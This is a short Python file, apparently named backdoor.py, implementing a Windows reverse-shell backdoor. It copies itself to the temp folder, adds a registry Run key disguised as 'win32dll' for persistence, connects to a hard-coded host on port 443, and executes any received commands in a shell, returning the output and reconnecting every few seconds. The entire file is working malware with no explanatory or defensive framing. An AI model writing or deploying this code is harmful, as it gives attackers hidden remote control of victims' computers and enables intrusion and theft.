import socket
import time
import subprocess
import tempfile
import os

ip = (str('192.168.0.100'))
port = (int('443'))
filename = ('backdoor.py')
tempdir = (tempfile.gettempdir())

def autorun():
        try:
                os.system('copy ' + filename + ' ' + tempdir)


        except:
                pass
        try:
                fnull = open(os.devnull, 'w')
                subprocess.Popen('REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
                 " /v win32dll /d " + tempdir + "\\" + filename, stdout=fnull, stderr=fnull)
        except:
                print('Erro no registro')
                pass

def connect(ip, port):
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.send('[!] Connection received\n'.encode())
                return(s)
        except:
                print('\n[!!] Error in connect')
                return None
        
def listen(s):
        try:
                while True:
                        data = s.recv(1024).decode()
                        if data[:-1] == '/exit':
                                s.close()
                                exit(0)
                        else:
                                cmd(s, data[:-1])
        except:
                error(s)                

def cmd(s, data):
        try:
                proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                ex = (proc.stdout.read() + proc.stderr.read())
                s.send(ex)
                
        except:
                error(s)

def error(s):
        if s:
                s.close()
        main()


def main():
        while True:
                s_connect = connect(ip, port)           
                if s_connect:
                        listen(s_connect)
                else:
                        time.sleep(5)
        

autorun()
main()
